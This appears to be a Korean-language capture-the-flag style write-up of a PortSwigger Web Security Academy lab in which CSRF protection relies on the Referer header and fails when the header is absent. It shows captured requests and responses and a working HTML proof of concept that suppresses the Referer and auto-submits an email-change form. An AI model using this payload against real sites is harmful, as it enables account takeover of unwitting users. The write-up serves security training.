# 🚩Lab: CSRF where Referer validation depends on header being present

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

### 🔍 분석 및 공격 과정
1. `wiener:peter` 로 로그인.
2. 로그인시 POST하는 패킷을 프록시로 관찰 -> set-cookie로 설정되는 session쿠키의 `SameSite=None`.
3. 임의의 이메일로 이메일을 변경해보자.
```http
POST /my-account/change-email HTTP/2
Host: 0a6000ba046e7d9684ee772f003600d0.web-security-academy.net
Cookie: session=vWzaco1UEd2i2cJDGP9Ch85YOaqpR6ur
Content-Length: 11
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: ko-KR,ko;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a6000ba046e7d9684ee772f003600d0.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6000ba046e7d9684ee772f003600d0.web-security-academy.net/my-account?id=wiener  
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

email=a%40d
```
4. 세션 쿠키와 변경할 email값을 포함시켜 보내고 있다. 그리고 `Referer`헤더가 존재한다. 이 요청을 리피터로 보내 `Referer` 헤더를 임의의 값으로 조작해본다. 그렇다면 다음과 같은 응답을 받을 수 있다.
```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 24

"Invalid referer header"
```
5. 문제의 제목에서 힌트를 줬듯이, 아예 `Referer` 헤더를 제거해보자. -> 성공적으로 이메일이 변경됨.
6. 세션 쿠키는 `SameSite=None`이라 크로스오리진의 요청에서도 포함이 되기에 고려할 필요없고, 중요한건 `Referer` 헤더를 포함시키지 않으면서 이메일 API에 POST 요청을 보내도록 하는 것.
7. PoC 스크립트 작성.
```html
<html>
    <head>
        <meta name="referrer" content="no-referrer">
    </head>
    <body>
        <form action="https://0a6000ba046e7d9684ee772f003600d0.web-security-academy.net/my-account/change-email" method="POST">
            <input name="email" value="a@aaa">
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

 

### 💡 취약점 원리
 `Referer`헤더를 베이스로 CSRF를 막고 있으나, `Referer`헤더값이 포함되지 않은 요청에 대한 처리가 제대로 구현되지 않아 검증이 우회되었음.
 
